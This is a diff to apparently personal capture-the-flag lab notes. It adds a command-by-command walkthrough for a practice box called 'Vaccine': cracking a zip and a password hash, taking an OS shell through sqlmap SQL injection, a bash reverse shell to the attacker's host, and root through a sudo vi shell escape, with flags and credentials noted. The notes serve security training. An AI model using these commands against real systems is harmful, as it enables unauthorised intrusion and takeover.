@@ -161,6 +161,7 @@ http://<ip_address>/cdn-cgi/login
 http://<ip-address>/cdn-cgi/login/admin.php?content=accounts&id=1
 # change role to admin and id to 34322
 # wfuzz will flag /uploads
+./directorysearch.sh --wfuzzdir <ip_address>
 http://<ip_address>/uploads/php-reverse-shell.php
 cp /usr/share/webshells/php/php-revere-shell.php
 # change ip address and port
@@ -185,5 +186,37 @@ export PATH=/tmp:$PATH
 ./bugtracker
 view /root/root.txt
 # root flag: af13b0bee69f8a877c3faf667f7beacf
+```
 
+## Vaccine
+
+```shell
+./networkscan.sh -- quick <ip_address>
+./networkscan.sh --slow <ip_address>
+ftp anonymous@<ip_address>
+get backup.zip
+zip2john backup.zip > hash.txt
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+sudo john --show hash.txt
+# password: 741852963 for backup.zip 
+cat index.php
+# md5 password: 2cb42f8734ea607eefed3b70af13bbd3
+#username: admin
+# md5 decrypt password: qwerty789
+sqlmap -u 'http://<ip_address>/dashboard.php?search=any+query' --cookie="PHPSESSID=7r5b6fefjq2a8nllra8thukft7" --os-shell
+cat ../../user.txt
+# User flag: ec9b13ca4d6229cd5cc1e09980965bf7
+bash -c "bash -i >& /dev/tcp/<host_ip>/9001 0>&1"
+nc -lvnp 9001
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cat /var/www/html/dashboard.php | grep -i pass
+# $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!")
+sudo -l
+# password: P@s5w0rd!
+# (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+:set shell=/bin/sh
+:shell
+cat /root/root.txt
+# root flag: dd6e058e814260bc70e9bbdef2715849
 ```
